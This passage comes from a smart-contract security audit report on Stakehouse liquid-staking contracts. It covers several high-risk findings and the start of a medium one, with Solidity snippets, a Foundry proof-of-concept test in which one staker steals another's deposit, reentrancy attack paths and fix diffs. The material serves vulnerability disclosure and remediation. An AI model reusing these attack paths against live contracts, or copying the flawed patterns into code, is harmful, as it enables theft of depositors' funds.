StakehouseAPI, GiantPoolBase {\n     /// @param _blsPublicKeys For every savETH vault, the list of BLS keys of LSDN validators receiving funding\n     /// @param _stakeAmounts For every savETH vault, the amount of ETH each BLS key will receive in funding\n     function batchDepositETHForStaking(\n-        address[] calldata _savETHVaults,\n+        address[] calldata _liquidStakingManagers,\n         uint256[] calldata _ETHTransactionAmounts,\n         bytes[][] calldata _blsPublicKeys,\n         uint256[][] calldata _stakeAmounts\n     ) public {\n-        uint256 numOfSavETHVaults = _savETHVaults.length;\n+        uint256 numOfSavETHVaults = _liquidStakingManagers.length;\n         require(numOfSavETHVaults > 0, \"Empty arrays\");\n         require(numOfSavETHVaults == _ETHTransactionAmounts.length, \"Inconsistent array lengths\");\n         require(numOfSavETHVaults == _blsPublicKeys.length, \"Inconsistent array lengths\");\n@@ -40,16 +41,18 @@ contract GiantSavETHVaultPool is StakehouseAPI, GiantPoolBase {\n\n         // For every vault specified, supply ETH for at least 1 BLS public key of a LSDN validator\n         for (uint256 i; i < numOfSavETHVaults; ++i) {\n+            require(\n+                liquidStakingDerivativeFactory.isLiquidStakingManager(_liquidStakingManagers[i]),\n+                \"Invalid liquid staking manager\"\n+            );\n+\n             uint256 transactionAmount = _ETHTransactionAmounts[i];\n\n             // As ETH is being deployed to a savETH pool vault, it is no longer idle\n             idleETH -= transactionAmount;\n\n-            SavETHVault savETHPool = SavETHVault(_savETHVaults[i]);\n-            require(\n-                liquidStakingDerivativeFactory.isLiquidStakingManager(address(savETHPool.liquidStakingManager())),\n-                \"Invalid liquid staking manager\"\n-            );\n+            LiquidStakingManager liquidStakingManager = LiquidStakingManager(payable(_liquidStakingManagers[i]));\n+            SavETHVault savETHPool = liquidStakingManager.savETHVault();\n\n             // Deposit ETH for staking of BLS key\n             savETHPool.batchDepositETHForStaking{ value: transactionAmount }(\n```\n\n**[vince0656 (Stakehouse) confirmed](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/251#issuecomment-1329428177)**\n\n\n\n***\n\n## [[H-18] Old stakers can steal deposits of new stakers in `StakingFundsVault`](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/255)\n*Submitted by [Jeiwan](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/255), also found by [immeas](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/387), [rbserver](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/375), [unforgiven](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/246), [cccz](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/227), and [9svR6w](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/114)*\n\n<https://github.com/code-423n4/2022-11-stakehouse/blob/5f853d055d7aa1bebe9e24fd0e863ef58c004339/contracts/liquid-staking/StakingFundsVault.sol#L75><br>\n<https://github.com/code-423n4/2022-11-stakehouse/blob/5f853d055d7aa1bebe9e24fd0e863ef58c004339/contracts/liquid-staking/StakingFundsVault.sol#L123><br>\n<https://github.com/code-423n4/2022-11-stakehouse/blob/5f853d055d7aa1bebe9e24fd0e863ef58c004339/contracts/liquid-staking/StakingFundsVault.sol#L63>\n\nStakers to the MEV+fees vault can steal funds from the new stakers who staked after a validator was registered and the derivatives were minted. A single staker who staked 4 ETH can steal all funds deposited by new stakers.\n\n### Proof of Concept\n\n`StakingFundsVault` is designed to pull rewards from a Syndicate contract and distributed them pro-rata among LP token holders ([StakingFundsVault.sol#L215-L231](https://github.com/code-423n4/2022-11-stakehouse/blob/5f853d055d7aa1bebe9e24fd0e863ef58c004339/contracts/liquid-staking/StakingFundsVault.sol#L215-L231)):\n\n```solidity\nif (i == 0 && !Syndicate(payable(liquidStakingNetworkManager.syndicate())).isNoLongerPartOfSyndicate(_blsPubKeys[i])) {\n    // Withdraw any ETH accrued on free floating SLOT from syndicate to this contract\n    // If a partial list of BLS keys that have free floating staked are supplied, then partial funds accrued will be fetched\n    _claimFundsFromSyndicateForDistribution(\n        liquidStakingNetworkManager.syndicate(),\n        _blsPubKeys\n    );\n\n    // Distribute ETH per LP\n    updateAccumulatedETHPerLP();\n}\n\n// If msg.sender has a balance for the LP token associated with the BLS key, then send them any accrued ETH\nLPToken token = lpTokenForKnot[_blsPubKeys[i]];\nrequire(address(token) != address(0), \"Invalid BLS key\");\nrequire(token.lastInteractedTimestamp(msg.sender) + 30 minutes < block.timestamp, \"Last transfer too recent\");\n_distributeETHRewardsToUserForToken(msg.sender, address(token), token.balanceOf(msg.sender), _recipient);\n```\n\nThe `updateAccumulatedETHPerLP` function calculates the reward amount per LP token share ([SyndicateRewardsProcessor.sol#L76](https://github.com/code-423n4/2022-11-stakehouse/blob/5f853d055d7aa1bebe9e24fd0e863ef58c004339/contracts/liquid-staking/SyndicateRewardsProcessor.sol#L76)):\n\n```solidity\nfunction _updateAccumulatedETHPerLP(uint256 _numOfShares) internal {\n    if (_numOfShares > 0) {\n        uint256 received = totalRewardsReceived();\n        uint256 unprocessed = received - totalETHSeen;\n\n        if (unprocessed > 0) {\n            emit ETHReceived(unprocessed);\n\n            // accumulated ETH per minted share is scaled to avoid precision loss. it is scaled down later\n            accumulatedETHPerLPShare += (unprocessed * PRECISION) / _numOfShares;\n\n            totalETHSeen = received;\n        }\n    }\n}\n```\n\nAnd the `_distributeETHRewardsToUserForToken` function distributes rewards to LP token holders ([SyndicateRewardsProcessor.sol#L51](https://github.com/code-423n4/2022-11-stakehouse/blob/5f853d055d7aa1bebe9e24fd0e863ef58c004339/contracts/liquid-staking/SyndicateRewardsProcessor.sol#L51)):\n\n```solidity\nfunction _distributeETHRewardsToUserForToken(\n    address _user,\n    address _token,\n    uint256 _balance,\n    address _recipient\n) internal {\n    require(_recipient != address(0), \"Zero address\");\n    uint256 balance = _balance;\n    if (balance > 0) {\n        // Calculate how much ETH rewards the address is owed / due \n        uint256 due = ((accumulatedETHPerLPShare * balance) / PRECISION) - claimed[_user][_token];\n        if (due > 0) {\n            claimed[_user][_token] = due;\n\n            totalClaimed += due;\n\n            (bool success, ) = _recipient.call{value: due}(\"\");\n            require(success, \"Failed to transfer\");\n\n            emit ETHDistributed(_user, _recipient, due);\n        }\n    }\n}\n```\n\nTo ensure that rewards are distributed fairly, these functions are called before LP token balances are updated (e.g. when making a deposit [StakingFundsVault.sol#L123](https://github.com/code-423n4/2022-11-stakehouse/blob/5f853d055d7aa1bebe9e24fd0e863ef58c004339/contracts/liquid-staking/StakingFundsVault.sol#L123)).\n\nHowever, this rewards accounting algorithm also counts deposited tokens:\n\n1.  to stake tokens, users call `depositETHForStaking` and send ETH ([StakingFundsVault.sol#L113](https://github.com/code-423n4/2022-11-stakehouse/blob/5f853d055d7aa1bebe9e24fd0e863ef58c004339/contracts/liquid-staking/StakingFundsVault.sol#L113));\n2.  `updateAccumulatedETHPerLP` is called in the function ([StakingFundsVault.sol#L123](https://github.com/code-423n4/2022-11-stakehouse/blob/5f853d055d7aa1bebe9e24fd0e863ef58c004339/contracts/liquid-staking/StakingFundsVault.sol#L123));\n3.  `updateAccumulatedETHPerLP` checks the balance of the contract, which *already includes the new staked amount* ([SyndicateRewardsProcessor.sol#L78](https://github.com/code-423n4/2022-11-stakehouse/blob/5f853d055d7aa1bebe9e24fd0e863ef58c004339/contracts/liquid-staking/SyndicateRewardsProcessor.sol#L78), [SyndicateRewardsProcessor.sol#L94](https://github.com/code-423n4/2022-11-stakehouse/blob/5f853d055d7aa1bebe9e24fd0e863ef58c004339/contracts/liquid-staking/SyndicateRewardsProcessor.sol#L94)).\n4.  the staked amount is then counted in the `accumulatedETHPerLPShare` variable ([SyndicateRewardsProcessor.sol#L85](https://github.com/code-423n4/2022-11-stakehouse/blob/5f853d055d7aa1bebe9e24fd0e863ef58c004339/contracts/liquid-staking/SyndicateRewardsProcessor.sol#L85)), which is used to calculate the reward amount per LP share ([SyndicateRewardsProcessor.sol#L61](https://github.com/code-423n4/2022-11-stakehouse/blob/5f853d055d7aa1bebe9e24fd0e863ef58c004339/contracts/liquid-staking/SyndicateRewardsProcessor.sol#L61)).\n\nThis allows the following attack:\n\n1.  a user stakes 4 ETH to a BLS key;\n2.  the validator with the BLS key gets registered and its derivative tokens get minted;\n3.  a new user stakes some amount to a different BLS key;\n4.  the first user calls `claimRewards` and withdraws the stake of the new user.\n\n```solidity\n// test/foundry/StakingFundsVault.t.sol\nfunction testStealingOfDepositsByOldStakers_AUDIT() public {\n    // Resetting the mocks, we need real action.\n    MockAccountManager(factory.accountMan()).setLifecycleStatus(blsPubKeyOne, 0);\n    MockAccountManager(factory.accountMan()).setLifecycleStatus(blsPubKeyTwo, 0);\n    liquidStakingManager.setIsPartOfNetwork(blsPubKeyOne, false);\n    liquidStakingManager.setIsPartOfNetwork(blsPubKeyTwo, false);\n\n    // Aliasing accounts for better readability.\n    address nodeRunner = accountOne;\n    address alice = accountTwo;\n    address alice2 = accountFour;\n    address bob = accountThree;\n\n    // Node runner registers two BLS keys.\n    registerSingleBLSPubKey(nodeRunner, blsPubKeyOne, accountFive);\n    registerSingleBLSPubKey(nodeRunner, blsPubKeyTwo, accountFive);\n\n    // Alice deposits to the MEV+fees vault of the first key.\n    maxETHDeposit(alice, getBytesArrayFromBytes(blsPubKeyOne));\n\n    // Someone else deposits to the savETH vault of the first key.\n    liquidStakingManager.savETHVault().depositETHForStaking{value: 24 ether}(blsPubKeyOne, 24 ether);\n\n    // The first validator is registered and the derivatives are minted.\n    assertEq(vault.totalShares(), 0);\n    stakeAndMintDerivativesSingleKey(blsPubKeyOne);\n    assertEq(vault.totalShares(), 4 ether);\n\n    // Warping to pass the lastInteractedTimestamp checks.\n    vm.warp(block.timestamp + 1 hours);\n\n    // The first key cannot accept new deposits since the maximal amount was deposited\n    // and the validator was register. The vault however can still be used to deposit to\n    // other keys.\n\n    // Bob deposits to the MEV+fees vault of the second key.\n    maxETHDeposit(bob, getBytesArrayFromBytes(blsPubKeyTwo));\n    assertEq(address(vault).balance, 4 ether);\n    assertEq(bob.balance, 0);\n\n    // Alice is claiming rewards for the first key.\n    // Notice that no rewards were distributed to the MEV+fees vault of the first key.\n    assertEq(alice2.balance, 0);\n    vm.startPrank(alice);\n    vault.claimRewards(alice2, getBytesArrayFromBytes(blsPubKeyOne));\n    vm.stopPrank();\n\n    LPToken lpTokenBLSPubKeyOne = vault.lpTokenForKnot(blsPubKeyOne);\n\n    // Alice has stolen the Bob's deposit.\n    assertEq(alice2.balance, 4 ether);\n    assertEq(vault.claimed(alice, address(lpTokenBLSPubKeyOne)), 4 ether);\n    assertEq(vault.claimed(alice2, address(lpTokenBLSPubKeyOne)), 0);\n\n    assertEq(address(vault).balance, 0);\n    assertEq(bob.balance, 0);\n}\n```\n\n### Recommended Mitigation Steps\n\nConsider excluding newly staked amounts in the `accumulatedETHPerLPShare` calculations.\n\n**[vince0656 (Stakehouse) confirmed duplicate issue #375](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/375#issuecomment-1329427565)**\n\n\n\n***\n\n## [[H-19] `withdrawETH()` in GiantPoolBase don't call `_distributeETHRewardsToUserForToken()` or `_onWithdraw()` which would make users to lose their remaining rewards ](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/260)\n*Submitted by [unforgiven](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/260), also found by [0x4non](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/280)*\n\n<https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantPoolBase.sol#L50-L64><br>\n<https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantMevAndFeesPool.sol#L180-L193>\n\nFunction `_distributeETHRewardsToUserForToken()` is used to distribute remaining reward of user and it's called in `_onWithdraw()` of `GiantMevAndFeesPool`. but function `withdrawETH()` in `GiantPoolBase` don't call either of them and burn user giant LP token balance so if user withdraw his funds and has some remaining ETH rewards he would lose those rewards because his balance set to zero.\n\n### Proof of Concept\n\nThis is `withdrawETH()` code in `GiantPoolBase`:\n\n        /// @notice Allow a user to chose to burn their LP tokens for ETH only if the requested amount is idle and available from the contract\n        /// @param _amount of LP tokens user is burning in exchange for same amount of ETH\n        function withdrawETH(uint256 _amount) external nonReentrant {\n            require(_amount >= MIN_STAKING_AMOUNT, \"Invalid amount\");\n            require(lpTokenETH.balanceOf(msg.sender) >= _amount, \"Invalid balance\");\n            require(idleETH >= _amount, \"Come back later or withdraw less ETH\");\n\n            idleETH -= _amount;\n\n            lpTokenETH.burn(msg.sender, _amount);\n            (bool success,) = msg.sender.call{value: _amount}(\"\");\n            require(success, \"Failed to transfer ETH\");\n\n            emit LPBurnedForETH(msg.sender, _amount);\n        }\n\nAs you can see it burn user `lpTokenETH` balance and don't call either `_distributeETHRewardsToUserForToken()` or `_onWithdraw()`. and in function `claimRewards()` uses `lpTokenETH.balanceOf(msg.sender)` to calculate user rewards so if user balance get to `0` user won't get the remaining rewards.\nThese are steps that this bug happens:\n\n1.  `user1` deposit `10` ETH into the giant pool and `claimed[user1][lpTokenETH]` is `20` and `accumulatedETHPerLPShare` is `2`.\n2.  some time passes and `accumulatedETHPerLPShare` set to `3`.\n3.  `user1` unclaimed rewards are `10 * 3 - 20 = 10` ETH.\n4.  `user1` withdraw his `10` ETH by calling `withdrawETH(10)` and contract set `lpTokenETH` balance of `user1`  to `0` and transfer `10` ETH to user.\n5.  now if `user1` calls `claimRewards()` he would get `0` reward as his `lpTokenETH` balance is `0`.\n\nso users lose their unclaimed rewards by withdrawing their funds.\n\n### Tools Used\n\nVIM\n\n### Recommended Mitigation Steps\n\nUser's unclaimed funds should be calculated and transferred before any actions that change user's balance.\n\n**[vince0656 (Stakehouse) confirmed](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/260#issuecomment-1329424012)**\n\n\n\n***\n\n## [[H-20] Possibly reentrancy attacks in `_distributeETHRewardsToUserForToken` function](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/328)\n*Submitted by [rotcivegaf](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/328), also found by [datapunk](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/414), [0x4non](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/341), and [clems4ever](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/35)*\n\n<https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/SyndicateRewardsProcessor.sol#L51-L73><br>\n<https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantMevAndFeesPool.sol#L146-L167><br>\n<https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantPoolBase.sol#L66-L90><br>\n<https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/StakingFundsVault.sol#L66-L104><br>\n<https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/StakingFundsVault.sol#L110-L143><br>\n<https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/StakingFundsVault.sol#L314-L340>\n\nThe root of the problem is in the `_distributeETHRewardsToUserForToken` which makes a call to distribute the ether rewards. With this call, the recipient can execute an reentrancy attack calling several times the different function to steal founds or take advantage of other users/protocol.\n\n### Proof of Concept\n\nThis functions use the `_distributeETHRewardsToUserForToken`:\n\n#### [`beforeTokenTransfer`, **GiantMevAndFeesPool** contract](https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantMevAndFeesPool.sol#L146-L167):\n\nThe contract **GiantLP** use the **GiantMevAndFeesPool** contract as [`transferHookProcessor`](https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantLP.sol#L14) and when use the functions [`_mint`, `_burn`, `transferFrom` and `transfer` of the ERC20](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v4.7/contracts/token/ERC20/ERC20.sol), the function [`beforeTokenTransfer`](https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantMevAndFeesPool.sol#L146-L167) implemented in the **GiantMevAndFeesPool** bring a possibility to make a reentrancy attack because in the function [`_distributeETHRewardsToUserForToken`](https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/SyndicateRewardsProcessor.sol#L51-L73) implemented in the [**GiantMevAndFeesPool** make a `call` to the `_recipient`](https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/SyndicateRewardsProcessor.sol#L67-L68)\n\nA contract can call the function `transfer` of **GiantLP** contract several time, transfer an `amount` from and to self, as the update of the [`claimed`](https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantMevAndFeesPool.sol#L203) would not be done until, it is executed the function [`_afterTokenTransfer`](https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantLP.sol#L43-L47) of the **GiantLP** contract, the [`due`](https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/SyndicateRewardsProcessor.sol#L61) amount calculated in `_distributeETHRewardsToUserForToken` of **SyndicateRewardsProcessor** contract and the `lastInteractedTimestamp` of **GiantLP** contract will be incorrect\n\n#### [`withdrawLPTokens`, **GiantPoolBase** contract](https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantPoolBase.sol#L66-L90):\n\nThe possibility of the reentrancy is given when call function [`_onWithdraw`](https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantPoolBase.sol#L74), this function implemented in [**GiantMevAndFeesPool** contract](https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantMevAndFeesPool.sol#L181-L193) uses `_distributeETHRewardsToUserForToken` and this one call the recipient making the possibility of the reentrancy, breaking the code of [L76-L89](https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantPoolBase.sol#L76-L89)\n\n#### [`batchDepositETHForStaking`, **StakingFundsVault** contract](https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/StakingFundsVault.sol#L66-L104):\n\nThe possibility of the reentrancy is given when call function [`_distributeETHRewardsToUserForToken`](https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/StakingFundsVault.sol#L88-L93), this function call the recipient making the possibility of the reentrancy, breaking the code of [L76-L89](https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/StakingFundsVault.sol#L96-L107)\n\n#### [`depositETHForStaking`, **StakingFundsVault** contract](https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/StakingFundsVault.sol#L110-L143):\n\nThe possibility of the reentrancy is given when call function [`_distributeETHRewardsToUserForToken`](https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/StakingFundsVault.sol#L128-L133), this function call the recipient making the possibility of the reentrancy, breaking the code of [L136-L142](https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/StakingFundsVault.sol#L136-L142)\n\n#### [`beforeTokenTransfer`, **StakingFundsVault** contract](https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/StakingFundsVault.sol#L314-L340):\n\nThe possibility of the reentrancy is given when call function `_distributeETHRewardsToUserForToken` in [L333](https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/StakingFundsVault.sol#L333) and [L337](https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/StakingFundsVault.sol#L337), this function call the recipient making the possibility of the reentrancy, breaking the code of [L343-L351](https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/StakingFundsVault.sol#L343-L351)\n\n### Recommended Mitigation Steps\n\nOne possibility is to wrap(`deposit`) ether in WETH and transfer as ERC20 token.\n\nAnother is to add `nonReentrant` guard to the functions:\n\n*   [`beforeTokenTransfer`, **GiantMevAndFeesPool** contract](https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantMevAndFeesPool.sol#L146-L167)\n*   [`withdrawLPTokens`, **GiantPoolBase** contract](https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantPoolBase.sol#L66-L90)\n*   [`batchDepositETHForStaking`, **StakingFundsVault** contract](https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/StakingFundsVault.sol#L66-L104)\n*   [`depositETHForStaking`, **StakingFundsVault** contract](https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/StakingFundsVault.sol#L110-L143)\n*   [`beforeTokenTransfer`, **StakingFundsVault** contract](https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/StakingFundsVault.sol#L314-L340)\n\n```diff\nFile: contracts/liquid-staking/GiantMevAndFeesPool.sol\n\n@@ -143,7 +143,7 @@ contract GiantMevAndFeesPool is ITransferHookProcessor, GiantPoolBase, Syndicate\n     }\n\n     /// @notice Allow giant LP token to notify pool about transfers so the claimed amounts can be processed\n-    function beforeTokenTransfer(address _from, address _to, uint256) external {\n+    function beforeTokenTransfer(address _from, address _to, uint256) external nonReentrant {\n         require(msg.sender == address(lpTokenETH), \"Caller is not giant LP\");\n         updateAccumulatedETHPerLP();\n```\n\n```diff\nFile: contracts/liquid-staking/GiantPoolBase.sol\n\n@@ -66,7 +66,7 @@ contract GiantPoolBase is ReentrancyGuard {\n     /// @notice Allow a user to chose to withdraw vault LP tokens by burning their giant LP tokens. 1 Giant LP == 1 vault LP\n     /// @param _lpTokens List of LP tokens being owned and being withdrawn from the giant pool\n     /// @param _amounts List of amounts of giant LP being burnt in exchange for vault LP\n-    function withdrawLPTokens(LPToken[] calldata _lpTokens, uint256[] calldata _amounts) external {\n+    function withdrawLPTokens(LPToken[] calldata _lpTokens, uint256[] calldata _amounts) external nonReentrant {\n         uint256 amountOfTokens = _lpTokens.length;\n         require(amountOfTokens > 0, \"Empty arrays\");\n         require(amountOfTokens == _amounts.length, \"Inconsistent array lengths\");\n```\n\n```diff\nFile: contracts/liquid-staking/StakingFundsVault.sol\n\n@@ -66,7 +66,7 @@ contract StakingFundsVault is\n     /// @notice Batch deposit ETH for staking against multiple BLS public keys\n     /// @param _blsPublicKeyOfKnots List of BLS public keys being staked\n     /// @param _amounts Amounts of ETH being staked for each BLS public key\n-    function batchDepositETHForStaking(bytes[] calldata _blsPublicKeyOfKnots, uint256[] calldata _amounts) external payable {\n+    function batchDepositETHForStaking(bytes[] calldata _blsPublicKeyOfKnots, uint256[] calldata _amounts) external payable nonReentrant {\n         uint256 numOfValidators = _blsPublicKeyOfKnots.length;\n         require(numOfValidators > 0, \"Empty arrays\");\n         require(numOfValidators == _amounts.length, \"Inconsistent array lengths\");\n\n@@ -110,7 +110,7 @@ contract StakingFundsVault is\n     /// @notice Deposit ETH against a BLS public key for staking\n     /// @param _blsPublicKeyOfKnot BLS public key of validator registered by a node runner\n     /// @param _amount Amount of ETH being staked\n-    function depositETHForStaking(bytes calldata _blsPublicKeyOfKnot, uint256 _amount) public payable returns (uint256) {\n+    function depositETHForStaking(bytes calldata _blsPublicKeyOfKnot, uint256 _amount) public payable nonReentrant returns (uint256) {\n         require(liquidStakingNetworkManager.isBLSPublicKeyBanned(_blsPublicKeyOfKnot) == false, \"BLS public key is banned or not a part of LSD network\");\n         require(\n             getAccountManager().blsPublicKeyToLifecycleStatus(_blsPublicKeyOfKnot) == IDataStructures.LifecycleStatus.INITIALS_REGISTERED,\n\n@@ -312,7 +312,7 @@ contract StakingFundsVault is\n     }\n\n     /// @notice before an LP token is transferred, pay the user any unclaimed ETH rewards\n-    function beforeTokenTransfer(address _from, address _to, uint256) external override {\n+    function beforeTokenTransfer(address _from, address _to, uint256) external override nonReentrant {\n         address syndicate = liquidStakingNetworkManager.syndicate();\n         if (syndicate != address(0)) {\n             LPToken token = LPToken(msg.sender);\n```\n\n**[vince0656 (Stakehouse) confirmed](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/328#issuecomment-1329416775)**\n\n\n\n***\n\n## [[H-21] `bringUnusedETHBackIntoGiantPool` in `GiantMevAndFeesPool` can be used to steal `LPTokens`](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/366)\n*Submitted by [datapunk](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/366)*\n\nreal `LPTokens` can be transferred out of `GiantMevAndFeesPool` through fake `_stakingFundsVaults` provided by an attacker.\n<https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantMevAndFeesPool.sol#L126>\n\n### Proof of Concept\n\n`bringUnusedETHBackIntoGiantPool` takes in `_stakingFundsVaults`, `_oldLPTokens`, `_newLPTokens` and rotate `_amounts` from old to new tokens. The tokens are thoroughly verified by `burnLPForETH` in `ETHPoolLPFactory`.<br>\nHowever, theres is no checking for the validity of `_stakingFundsVaults`, nor the relationship between `LPTokens` and `_stakingFundsVaults`. Therefore, an attacker can create fake contracts for `_stakingFundsVaults`, with `burnLPTokensForETH`, that takes `LPTokens` as parameters. The `msg.sender` in `burnLPTokensForETH` is `GiantMevAndFeesPool`, thus the attacker can transfer `LPTokens` that belongs to `GiantMevAndFeesPool` to any addresses it controls.\n\n### Recommended Mitigation Steps\n\nAlways passing liquid staking manager address, checking its real and then requesting either the savETH vault or staking funds vault is a good idea to prove the validity of vaults.\n\n**[vince0656 (Stakehouse) confirmed](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/366#issuecomment-1329404515)**\n\n\n\n***\n \n# Medium Risk Findings (31)\n## [[M-01] Freezing of funds - Hacker can prevent users withdraws in giant pools](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/49)\n*Submitted by [0xdeadbeef0x](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/49), also found by [Trust](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/440), [JTJabba](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/439), [joestakey](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/429), [V\\_B](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/395), [minhtrng](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/392), [unforgiven](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/291), [Jeiwan](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/252), [hihen](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/215), [Lambda](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/138), [aphak5010](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/58), and [HE1M](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/41)*\n\n<https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantPoolBase.sol#L69><br>\n<https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantSavETHVaultPool.sol#L66><br>\n<https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantPoolBase.sol#L96>\n\n### Impact\n\nA hacker can prevent users from withdrawing dETH or LPTokens in giant pools.\n\nThis bug causes a revert in:\n\n1.  `WithdrawLP` - `GiantMevAndFeesPool`\n2.  `WithdrawLP` - `GiantSavETHVaultPool`\n3.  `WithdrawDETH` - `GiantSavETHVaultPool`\n\nA hacker can prevent a user from receiving dETH when users are eligible and guaranteed to receive it through their stake.\n\nThis causes a liquidity crunch as the only funds that are possible to withdraw are ETH. There is not enough ETH in the giant pools to facilitate a large withdraw as ETH is staked for LPTokens and dETH.\n\nThe giant pools will become insolvent to returning ETH, dETH or vault LPTokens.\n\n### Proof of Concept\n\nBoth `WithdrawLP` and `WithdrawDETH` act in a similar way:\n\n1.  loop LPtokens received for withdraw\n2.  Check user has enough Giant LP tokens to burn and pool has enough vault LP to give.\n3. 